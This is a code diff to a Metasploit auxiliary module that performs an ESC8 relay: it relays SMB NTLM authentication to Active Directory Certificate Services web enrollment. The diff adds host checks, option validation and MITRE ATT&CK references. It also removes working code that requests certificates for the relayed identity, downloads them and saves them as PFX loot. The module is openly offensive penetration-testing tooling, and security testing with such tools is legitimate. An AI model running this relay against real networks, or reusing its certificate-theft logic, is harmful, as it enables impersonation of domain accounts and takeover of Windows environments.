@@ -6,8 +6,9 @@
 class MetasploitModule < Msf::Auxiliary
   include ::Msf::Exploit::Remote::SMB::RelayServer
   include ::Msf::Exploit::Remote::HttpClient
+  include ::Msf::Exploit::Remote::HTTP::WebEnrollment
 
-  def initialize
+  def initialize(_info = {})
     super({
       'Name' => 'ESC8 Relay: SMB to HTTP(S)',
       'Description' => %q{
@@ -21,8 +22,13 @@ class MetasploitModule < Msf::Auxiliary
         'jhicks-r7', # query for available certs
         'Spencer McIntyre'
       ],
+      'References' => [
+        ['ATT&CK', Mitre::Attack::Technique::T1557_ADVERSARY_IN_THE_MIDDLE],
+        ['ATT&CK', Mitre::Attack::Technique::T1649_STEAL_OR_FORGE_AUTHENTICATION_CERTIFICATES]
+      ],
       'License' => MSF_LICENSE,
       'Actions' => [[ 'Relay', { 'Description' => 'Run SMB ESC8 relay server' } ]],
+      'DefaultOptions' => { 'HTTP::Auth' => 'ntlm' },
       'PassiveActions' => [ 'Relay' ],
       'DefaultAction' => 'Relay'
     })
@@ -40,21 +46,20 @@ class MetasploitModule < Msf::Auxiliary
         OptBool.new('RANDOMIZE_TARGETS', [true, 'Whether the relay targets should be randomized', true]),
       ]
     )
-
-    deregister_options('RHOSTS')
+    @issued_certs = {}
   end
 
   def relay_targets
-    Msf::Exploit::Remote::SMB::Relay::TargetList.new(
+    Msf::Exploit::Remote::Relay::TargetList.new(
       (datastore['SSL'] ? :https : :http),
       datastore['RPORT'],
-      datastore['RELAY_TARGETS'],
+      datastore['RHOSTS'],
       datastore['TARGETURI'],
       randomize_targets: datastore['RANDOMIZE_TARGETS']
     )
   end
 
-  def initial_handshake?(target_ip)
+  def check_host(target_ip)
     res = send_request_raw(
       {
         'rhost' => target_ip,
@@ -67,32 +72,50 @@ class MetasploitModule < Msf::Auxiliary
     )
     disconnect
 
-    res&.code == 401
+    return Exploit::CheckCode::Unknown('No response received from target') if res.nil?
+    unless res.code == 401
+      return Exploit::CheckCode::Safe('The target does not require authentication.')
+    end
+
+    unless res.headers['WWW-Authenticate'].include?('NTLM') && res.body.present?
+      return Exploit::CheckCode::Safe('The target does not support NTLM.')
+    end
+
+    if datastore['SSL']
+      # if the target is over SSL, downgrade to "Detected" because Extended Protection for Authentication may or may not be enabled
+      Exploit::CheckCode::Detected('Server replied that authentication is required and NTLM is supported. Target is over SSL, Extended Protection for Authentication (EPA) may or may not be enabled.')
+    else
+      Exploit::CheckCode::Appears('Server replied that authentication is required and NTLM is supported.')
+    end
   end
 
-  def check_options
-    if datastore['RHOSTS'].present?
-      print_warning('Warning: RHOSTS datastore value has been set which is not supported by this module. Please verify RELAY_TARGETS is set correctly.')
+  def validate
+    errors = {}
+    unless datastore['HTTP::Auth'] == 'ntlm'
+      errors['HTTP::Auth'] = 'This module only supports NTLM authentication.'
     end
 
     case datastore['MODE']
     when 'SPECIFIC_TEMPLATE'
-      if datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
-        fail_with(Failure::BadConfig, 'CERT_TEMPLATE must be set in AUTO and SPECIFIC_TEMPLATE mode')
+      if datastore['CERT_TEMPLATE'].blank?
+        errors['CERT_TEMPLATE'] = 'CERT_TEMPLATE must be set when MODE is SPECIFIC_TEMPLATE.'
       end
     when 'ALL', 'AUTO', 'QUERY_ONLY'
       unless datastore['CERT_TEMPLATE'].nil? || datastore['CERT_TEMPLATE'].blank?
         print_warning('CERT_TEMPLATE is ignored in ALL, AUTO, and QUERY_ONLY modes.')
       end
     end
+
+    raise OptionValidateError, errors unless errors.empty?
+
+    super
   end
 
   def run
-    check_options
-    @issued_certs = {}
     relay_targets.each do |target|
       vprint_status("Checking endpoint on #{target}")
-      unless initial_handshake?(target.ip)
+      check_code = check_host(target.ip)
+      if [Exploit::CheckCode::Unknown, Exploit::CheckCode::Safe].include?(check_code)
         fail_with(Failure::UnexpectedReply, "Web Enrollment does not appear to be enabled on #{target}")
       end
     end
@@ -127,103 +150,4 @@ class MetasploitModule < Msf::Auxiliary
     relay_connection.disconnect!
   end
 
-  def create_csr(private_key, cert_template)
-    vprint_status('Generating CSR...')
-    request = Rex::Proto::X509::Request.create_csr(private_key, cert_template)
-    vprint_status('CSR Generated')
-    request
-  end
-
-  def get_cert_templates(relay_connection)
-    print_status('Retrieving available template list, this may take a few minutes')
-    res = send_request_raw(
-      {
-        'client' => relay_connection,
-        'method' => 'GET',
-        'uri' => normalize_uri(target_uri, 'certrqxt.asp')
-      }
-    )
-    return nil unless res&.code == 200
-
-    cert_templates = res.body.scan(/^.*Option Value="[E|O];(.*?);/).map(&:first)
-    print_bad('Found no available certificate templates') if cert_templates.empty?
-    cert_templates
-  end
-
-  def add_cert_entry(relay_identity, cert_template)
-    if @issued_certs.key?(relay_identity)
-      @issued_certs[relay_identity] << cert_template
-    else
-      @issued_certs[relay_identity] = [ cert_template ]
-    end
-  end
-
-  def retrieve_certs(relay_connection, relay_identity, cert_templates)
-    cert_templates.each do |cert_template|
-      retrieve_cert(relay_connection, relay_identity, cert_template)
-    end
-  end
-
-  def cert_issued?(relay_identity, cert_template)
-    !!@issued_certs[relay_identity]&.include?(cert_template)
-  end
-
-  def retrieve_cert(relay_connection, relay_identity, cert_template)
-    if cert_issued?(relay_identity, cert_template)
-      print_status("Certificate already created for #{relay_identity} using #{cert_template}, skipping...")
-      return nil
-    end
-
-    vprint_status("Creating certificate request for #{relay_identity} using the #{cert_template} template")
-    private_key = OpenSSL::PKey::RSA.new(4096)
-    request = create_csr(private_key, cert_template)
-    cert_template_string = "CertificateTemplate:#{cert_template}"
-    vprint_status('Requesting relay target generate certificate...')
-    res = send_request_raw(
-      {
-        'client' => relay_connection,
-        'method' => 'POST',
-        'uri' => normalize_uri(datastore['TARGETURI'], 'certfnsh.asp'),
-        'ctype' => 'application/x-www-form-urlencoded',
-        'vars_post' => {
-          'Mode' => 'newreq',
-          'CertRequest' => request.to_s,
-          'CertAttrib' => cert_template_string,
-          'TargetStoreFlags' => 0,
-          'SaveCert' => 'yes',
-          'ThumbPrint' => ''
-        },
-        'cgi' => true
-      }
-    )
-    if res&.code == 200 && !res.body.include?('request was denied')
-      print_good("Certificate generated using template #{cert_template} and #{relay_identity}")
-      add_cert_entry(relay_identity, cert_template)
-    else
-      print_bad("Certificate request denied using template #{cert_template} and #{relay_identity}")
-      return nil
-    end
-
-    location_tag = res.body.match(/^.*location="(.*)"/)[1]
-    location_uri = normalize_uri(target_uri, location_tag)
-    vprint_status("Attempting to download the certificate from #{location_uri}")
-    res = send_request_raw(
-      {
-        'client' => relay_connection,
-        'method' => 'GET',
-        'uri' => location_uri
-      }
-    )
-    info = "#{relay_identity} Certificate"
-    certificate = OpenSSL::X509::Certificate.new(res.body)
-    pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
-    stored_path = store_loot('windows.ad.cs',
-                             'application/x-pkcs12',
-                             relay_connection.target.ip,
-                             pkcs12.to_der,
-                             'certificate.pfx',
-                             info)
-    print_good("Certificate for #{relay_identity} using template #{cert_template} saved to #{stored_path}")
-    certificate
-  end
 end
